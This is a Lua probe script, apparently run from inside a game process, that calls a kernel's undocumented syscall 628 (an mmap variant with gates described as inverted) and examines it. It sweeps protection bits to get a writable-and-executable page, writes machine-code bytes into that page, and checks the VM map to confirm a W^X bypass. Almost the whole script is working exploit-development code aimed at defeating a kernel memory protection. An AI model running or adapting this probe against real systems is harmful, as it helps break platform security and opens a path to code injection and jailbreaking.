-- CRASH_CLASS: LOW
-- PROBE 101a: sys 628 mmap variant — inverse authority gates, potential W^X bypass
--
-- Context: Decompiled handler analysis reveals sys 628 is a mmap-like mapping
-- syscall with 6 args that has INVERSE authority gates:
--
--   Gate 1 (0xffffffff8afc9560): Rejects callers where BOTH authority+0x6f bit6
--          AND authority+0x82 bit7 are set. Returns 1 → handler returns 1.
--   Gate 2 (0xffffffff8afc95a0): Rejects callers where BOTH authority+0x6f bit6
--          AND authority+0x82 bit6 are set. Returns 1 → handler returns 1.
--   Gate 3 (0xffffffff8afc92d0): Rejects specific privileged identities
--          (0x4800000010000004, etc.). Returns nonzero → handler returns 1.
--
--   These gates REJECT privileged callers and ALLOW unprivileged ones!
--   Our unprivileged game process should PASS all three gates.
--
-- Protection mask: 0x3f3 (allowed bits) — includes READ(1) + WRITE(2) + EXEC(0x10)!
-- Protection transform: prot | ((prot >> 1) & 0x141) — WRITE implies READ
-- Flag mask: 0x009fdf2f rejected — many flags available
-- Descriptor -1 = anonymous mapping (bypasses fd lookup)
-- Address and length must be 16KB aligned (0x4000)
-- Offset must be 16KB aligned
--
-- CRITICAL: If we can create an RWX mapping through this path: W^X BYPASS!
-- The delegate function may take a different VM code path than regular mmap(477).
--
-- Section A: Basic reachability with anonymous mapping
-- Section B: Protection sweep (including RWX combinations)
-- Section C: Flag mode exploration (0xff000000 selector)
-- Section D: Verify mapping with read/write/execute tests

local TEST_SECTION = TEST_SECTION or "C"

print("=== PROBE 101a: SYS 628 MMAP VARIANT ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc628 = make_syscall(628)
local sc624 = make_syscall(624)
local sc477 = make_syscall(477)  -- regular mmap for comparison
local sc547 = make_syscall(547)  -- VM region query

if TEST_SECTION == "A" then
    print("--- Section A: sys 628 basic reachability ---")
    print("  6 args: address(u64), length(u64), descriptor(u32), protection(u32), flags(u32), offset(u64)")
    print("  Inverse authority gates: REJECTS privileged, ALLOWS unprivileged")
    print("  Descriptor -1 = anonymous, address/length/offset 16KB aligned")
    print("")

    -- Test 1: Anonymous RW mapping (should be safest)
    print("[A1] Anonymous RW mapping (desc=-1, prot=0x03, flags=0):")
    local ok, rv = pcall(function()
        return sc628(
            uint64(0),                       -- address (hint, 0 = kernel chooses)
            uint64(0x4000),                  -- length (1 page = 16KB)
            uint64(0xFFFFFFFF),              -- descriptor = -1 (anonymous)
            uint64(3),                       -- protection = RW (0x03)
            uint64(0),                       -- flags = 0
            uint64(0)                        -- offset = 0
        )
    end)
    if ok then
        local h, l = get_hi_lo(rv)
        print("  ret=" .. fmt(rv))
        if h ~= 0xFFFFFFFF and l ~= 0xFFFFFFFF then
            print("  *** MAPPING RETURNED ADDRESS ***")
            -- Try to read/write the mapped address
            local addr = rv
            local rd = safe_rd(addr)
            print("  read[0]: " .. (rd and string.format("0x%08X", rd) or "FAIL"))
            local wr = safe_wd(addr, 0x41424344)
            print("  write: " .. (wr and "OK" or "FAIL"))
            if wr then
                local rd2 = safe_rd(addr)
                print("  read-back: " .. (rd2 and string.format("0x%08X", rd2) or "FAIL"))
            end
        end
    else
        print("  PCALL-FAIL")
    end
    print("")

    -- Test 2: With common flag combinations
    print("[A2] Flag variations (anonymous RW):")
    local flag_tests = {
        {0x00000000, "bare"},
        {0x00001000, "MAP_ANON"},
        {0x00001002, "MAP_ANON|MAP_PRIVATE"},
        {0x00200000, "bit21"},
        {0x01000000, "mode 0x01"},
        {0x02000000, "mode 0x02"},
    }
    for _, ft in ipairs(flag_tests) do
        local ok2, rv2 = pcall(function()
            return sc628(
                uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
                uint64(3), uint64(ft[1]), uint64(0)
            )
        end)
        local ret = ok2 and fmt(rv2) or "PCALL-FAIL"
        print(string.format("  flags=0x%08X (%s): ret=%s", ft[1], ft[2], ret))
    end
    print("")

    -- Test 3: Compare with regular mmap(477)
    print("[A3] Comparison with regular mmap(477):")
    local ok3, rv3 = pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    print("  mmap(477) anon RW: ret=" .. (ok3 and fmt(rv3) or "PCALL-FAIL"))
    print("")

    -- Test 4: With descriptor (e.g., GPU fd)
    print("[A4] With descriptor=0 (likely invalid):")
    local ok4, rv4 = pcall(function()
        return sc628(uint64(0), uint64(0x4000), uint64(0), uint64(3),
            uint64(0), uint64(0))
    end)
    print("  desc=0: ret=" .. (ok4 and fmt(rv4) or "PCALL-FAIL"))
    print("")

    -- Stability
    print("[A5] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: Protection sweep (W^X test) ---")
    print("  Allowed mask: 0x3f3 (bits 0,1,4,5,6,7,8,9)")
    print("  Transform: prot | ((prot >> 1) & 0x141)")
    print("  CRITICAL: If prot=0x13 (RWX) creates an RWX mapping → W^X BYPASS!")
    print("")

    -- Test all interesting protection combinations
    local prot_tests = {
        {0x00, "NONE"},
        {0x01, "R"},
        {0x02, "W"},
        {0x03, "RW"},
        {0x10, "X"},
        {0x11, "RX"},
        {0x12, "WX"},
        {0x13, "RWX"},
        {0x30, "X+bit5"},
        {0x33, "RW+bits4-5"},
        {0x70, "bits4-6"},
        {0xF3, "RW+bits4-7"},
        {0x103, "RW+bit8"},
        {0x203, "RW+bit9"},
        {0x3F3, "all allowed bits"},
    }

    print("[B1] Protection sweep (anonymous mapping):")
    for _, pt in ipairs(prot_tests) do
        local ok, rv = pcall(function()
            return sc628(
                uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
                uint64(pt[1]), uint64(0), uint64(0)
            )
        end)
        if ok then
            local h, l = get_hi_lo(rv)
            local is_addr = (h ~= 0xFFFFFFFF) and (l ~= 0xFFFFFFFF) and (h ~= 0 or l ~= 0)
            local is_err = (l <= 100 and h == 0)

            if is_addr and not is_err then
                print(string.format("  prot=0x%03X (%s): addr=%s *** MAPPED ***", pt[1], pt[2], fmt(rv)))

                -- If this has EXEC bit, try to verify protection via sys 547
                if pt[1] >= 0x10 then
                    print("    *** EXEC BIT SET — checking for W^X bypass ***")
                end

                -- Try read/write
                local rd = safe_rd(rv)
                local wr = safe_wd(rv, 0xDEADBEEF)
                print(string.format("    read=%s write=%s",
                    rd and "OK" or "FAIL", wr and "OK" or "FAIL"))

                -- If both read and write work AND exec bit was requested: W^X bypass!
                if wr and pt[1] >= 0x10 then
                    print("    *** WRITE+EXEC SUCCEEDED — POTENTIAL W^X BYPASS! ***")
                end
            else
                print(string.format("  prot=0x%03X (%s): ret=%s", pt[1], pt[2], fmt(rv)))
            end
        else
            print(string.format("  prot=0x%03X (%s): PCALL-FAIL", pt[1], pt[2]))
        end
    end
    print("")

    -- If any mapping succeeded, verify via VM map query
    print("[B2] Verify RWX mapping protection via sys 674 (VM map):")
    local sc674 = make_syscall(674)
    local map_buf = memory.alloc(0x2000)
    local count_buf = memory.alloc(8)
    safe_wd(count_buf, 30)

    local ok, rv = pcall(function()
        return sc674(uint64(map_buf), uint64(count_buf))
    end)
    if ok and to_num(rv) == 0 then
        local count = safe_rd(count_buf) or 0
        print("  VM map regions: " .. count)
        -- Look for any region with EXEC+WRITE
        for i = 0, math.min(count - 1, 29) do
            local base = map_buf + i * 72
            local prot_val = safe_rd(base + 0x18) or 0
            local has_exec = (prot_val % 256) >= 0x10  -- simplistic check
            local has_write = ((prot_val % 4) >= 2)
            if has_exec and has_write then
                local addr_q = safe_rq(base)
                print(string.format("    *** RWX REGION at %s prot=0x%X ***",
                    addr_q and fmt(addr_q) or "?", prot_val))
            end
        end
    end
    print("")

    -- Stability
    print("[B3] Stability:")
    local ok3, rv3 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok3 and fmt(rv3) or "FAIL"))

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: Flag mode exploration ---")
    print("  flags & 0xff000000 selects mode:")
    print("    0x00: derives from vm+0x244 & parent+0x5d8")
    print("    0x01000000: mode from parent+0xc81")
    print("    others: (int32)flags >> 16 & 0xffffff00")
    print("  flag 0x10: fixed-address path (requires nonzero address in VM range)")
    print("  flag 0x40: single-page limit")
    print("")

    -- Test flag 0x10 (fixed address) with our heap
    print("[C1] Flag 0x10 (fixed-address) with heap address:")
    local heap = memory.alloc(0x10000)  -- allocate heap buffer
    -- Align to 16KB
    local h_num = to_num(heap)
    local aligned = h_num
    if h_num % 0x4000 ~= 0 then
        aligned = h_num + (0x4000 - (h_num % 0x4000))
    end

    local ok, rv = pcall(function()
        return sc628(
            uint64(aligned), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(3), uint64(0x10), uint64(0)
        )
    end)
    print("  fixed addr=" .. string.format("0x%X", aligned) .. ": ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    print("")

    -- Test mode values
    print("[C2] Mode sweep (flags & 0xff000000):")
    local modes = {0x00, 0x01, 0x02, 0x03, 0x04, 0x10, 0x20, 0x40, 0x80, 0xFF}
    for _, mode in ipairs(modes) do
        local flags = mode * 0x1000000
        local ok2, rv2 = pcall(function()
            return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
                uint64(3), uint64(flags), uint64(0))
        end)
        print(string.format("  mode=0x%02X (flags=0x%08X): ret=%s", mode, flags,
            ok2 and fmt(rv2) or "PCALL-FAIL"))
    end
    print("")

    -- Test flag 0x40 (single-page limit) with different lengths
    print("[C3] Flag 0x40 (single-page limit):")
    local lengths = {0x4000, 0x8000, 0xC000, 0x10000}
    for _, len in ipairs(lengths) do
        local ok3, rv3 = pcall(function()
            return sc628(uint64(0), uint64(len), uint64(0xFFFFFFFF),
                uint64(3), uint64(0x40), uint64(0))
        end)
        print(string.format("  len=0x%X flag=0x40: ret=%s", len, ok3 and fmt(rv3) or "PCALL-FAIL"))
    end
    print("")

    -- Test invalid protection (should fail)
    print("[C4] Invalid protection (mask 0xfffffc0c):")
    local bad_prots = {0x04, 0x08, 0x400, 0x800, 0xFFF}
    for _, bp in ipairs(bad_prots) do
        local ok4, rv4 = pcall(function()
            return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
                uint64(bp), uint64(0), uint64(0))
        end)
        print(string.format("  prot=0x%X: ret=%s (expect 22)", bp, ok4 and fmt(rv4) or "PCALL-FAIL"))
    end
    print("")

    -- Stability
    print("[C5] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: Mapping verification + execute test ---")
    print("  If any mapping from B succeeded, verify read/write/execute")
    print("")

    -- Create our best-case mapping attempt
    print("[D1] Create anonymous RWX mapping via sys 628:")
    local ok, rv = pcall(function()
        return sc628(
            uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(0x13),      -- RWX (READ|WRITE|EXEC)
            uint64(0), uint64(0)
        )
    end)

    local map_addr = nil
    if ok then
        local h, l = get_hi_lo(rv)
        if h ~= 0xFFFFFFFF and l ~= 0xFFFFFFFF and (h ~= 0 or l > 100) then
            map_addr = rv
            print("  Mapped at: " .. fmt(rv))
        else
            print("  ret=" .. fmt(rv) .. " (not a valid address)")
        end
    else
        print("  PCALL-FAIL — trying RW only")
        -- Fallback: try RW
        ok, rv = pcall(function()
            return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
                uint64(0x03), uint64(0), uint64(0))
        end)
        if ok then
            local h, l = get_hi_lo(rv)
            if h ~= 0xFFFFFFFF and l ~= 0xFFFFFFFF and (h ~= 0 or l > 100) then
                map_addr = rv
                print("  RW mapped at: " .. fmt(rv))
            else
                print("  RW ret=" .. fmt(rv))
            end
        end
    end

    if map_addr then
        -- Test read
        print("")
        print("[D2] Read/write test on mapping:")
        local rd1 = safe_rd(map_addr)
        print("  initial read: " .. (rd1 and string.format("0x%08X", rd1) or "FAIL"))

        local wr1 = safe_wd(map_addr, 0x41414141)
        print("  write 0x41414141: " .. (wr1 and "OK" or "FAIL"))

        local rd2 = safe_rd(map_addr)
        print("  read-back: " .. (rd2 and string.format("0x%08X", rd2) or "FAIL"))

        -- Write ret gadget bytes (xor eax,eax; ret = 0x31 0xC0 0xC3)
        print("")
        print("[D3] Write ret-gadget bytes to mapped page:")
        -- Write: xor eax,eax; ret (returns 0)
        local wr_code = safe_wd(map_addr, 0xC3C03190)  -- nop; xor eax,eax; ret (little-endian)
        print("  write nop;xor eax,eax;ret: " .. (wr_code and "OK" or "FAIL"))

        -- Read back to verify
        local code_rd = safe_rd(map_addr)
        if code_rd then
            print("  read-back: " .. string.format("0x%08X", code_rd))
            if code_rd == 0xC3C03190 then
                print("  *** CODE BYTES WRITTEN SUCCESSFULLY ***")
            end
        end

        -- Query VM map protection on this address via sys 674
        print("")
        print("[D4] Query mapping protection via sys 674:")
        local sc674 = make_syscall(674)
        local map_buf = memory.alloc(0x4000)
        local cnt_buf = memory.alloc(8)
        safe_wd(cnt_buf, 50)

        local ok2, rv2 = pcall(function()
            return sc674(uint64(map_buf), uint64(cnt_buf))
        end)
        if ok2 and to_num(rv2) == 0 then
            local count = safe_rd(cnt_buf) or 0
            local ma_h, ma_l = get_hi_lo(map_addr)
            for i = 0, math.min(count - 1, 49) do
                local base = map_buf + i * 72
                local region_start = safe_rq(base)
                local region_end = safe_rq(base + 8)
                if region_start and region_end then
                    local rs_h, rs_l = get_hi_lo(region_start)
                    local re_h, re_l = get_hi_lo(region_end)
                    -- Check if our mapped address falls in this region
                    if (ma_h > rs_h or (ma_h == rs_h and ma_l >= rs_l)) and
                       (ma_h < re_h or (ma_h == re_h and ma_l < re_l)) then
                        local prot = safe_rd(base + 0x18) or 0
                        print(string.format("  Found region: %s-%s prot=0x%X",
                            fmt(region_start), fmt(region_end), prot))
                        local has_r = (prot % 2 == 1)
                        local has_w = (math.floor(prot / 2) % 2 == 1)
                        local has_x = (math.floor(prot / 16) % 2 == 1)
                        print(string.format("    R=%s W=%s X=%s",
                            has_r and "YES" or "no",
                            has_w and "YES" or "no",
                            has_x and "YES" or "no"))
                        if has_w and has_x then
                            print("    *** W^X BYPASS CONFIRMED! WRITE+EXECUTE REGION EXISTS ***")
                        end
                        break
                    end
                end
            end
        else
            print("  sys 674 failed")
        end
    end
    print("")

    -- Stability
    print("[D5] Stability:")
    local ok6, rv6 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok6 and fmt(rv6) or "FAIL"))

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 101a COMPLETE ===")

